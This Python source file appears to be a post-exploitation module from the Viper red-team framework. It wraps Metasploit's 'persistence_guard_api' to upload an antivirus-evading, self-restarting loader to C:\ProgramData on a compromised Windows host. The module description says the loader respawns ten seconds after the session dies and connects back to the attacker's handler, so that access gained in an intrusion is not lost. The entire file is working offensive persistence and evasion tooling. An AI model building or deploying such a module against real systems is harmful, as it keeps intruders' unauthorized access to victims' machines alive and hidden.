# -*- coding: utf-8 -*-

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "Windows自守护Session"
    DESC_ZH = "模块上传带有守护自身功能的加载器到主机指定目录(C:\ProgramData\XXX).\n" \
              "当前生成的Session进程崩溃或退出时会在10s后自动重新启动.\n" \
              "主要用于生成备用Session,防止初始权限丢失.\n" \
              "建议在取得第一个Session后马上运行此模块,确保权限不丢失\n" \
              "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."

    NAME_EN = "Windows self-guarding Session"
    DESC_EN = "The module uploads the loader with the function of guarding itself to the designated directory (C:\ProgramData\XXX) of the host.\n" \
              "When the currently generated Session process crashes or exits, it will automatically restart after 10s.\n" \
              "It is mainly used to generate a backup session to prevent the loss of initial permissions.\n" \
              "It is recommended to run this module immediately after obtaining the first Session to ensure that the permissions are not lost\n" \
              "When using the module, do not turn off the corresponding handler, the Loader needs to be connected back to the monitoring to obtain the core library files."

    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1050"]  # ATTCK向量
    AUTHOR = ["Viper"]
    README = ["https://www.yuque.com/vipersec/module/pixh1u"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    OPTIONS = register_options([
        OptionHander(),
        OptionCacheHanderConfig(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/persistence_guard_api"

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        self.set_payload_by_handler()
        if 'windows' not in self.opts.get('PAYLOAD').lower():
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"
        exe_filepath = self.generate_bypass_exe_file(template="REVERSE_HEX_GUARD")
        self.set_msf_option("EXE::Custom", exe_filepath)
        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good(f"EXE路径: {data.get('path')}", f"EXE path: {data.get('path')}")
            self.cache_handler()
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
